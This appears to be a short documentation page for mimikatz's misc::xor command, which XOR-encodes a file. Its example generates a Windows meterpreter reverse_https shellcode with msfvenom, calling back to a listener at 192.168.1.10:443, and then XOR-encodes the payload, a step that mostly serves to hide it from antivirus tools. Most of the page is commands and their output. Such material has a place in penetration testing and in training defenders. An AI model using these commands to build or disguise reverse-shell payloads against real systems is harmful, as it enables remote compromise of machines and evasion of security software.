# xor

`misc::xor` performs XOR decoding/encoding on a provided file with `0x42` default key. It has the following command line arguments:

* `/input`: the file to XOR encode
* `/output`: the file to save the results
* `/xor`: they XOR key

The following example XOR encodes a metasploit generated shellcode:

```
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.10 LPORT=443 -f raw -o mimi.bin
```

```
mimikatz # misc::xor /input:mimi.bin /output:mimi-xor.bin
Input : mimi.bin
Output: mimi-xor.bin
Xor   : 0x42

Opening: OK
Writing: OK
```

Provide an XOR encoding key:

```
mimikatz # misc::xor /input:mimi.bin /output:mimi-xor.bin /xor:0x40
Input : mimi.bin
Output: mimi-xor.bin
Xor   : 0x40

Opening: OK
Writing: OK
```
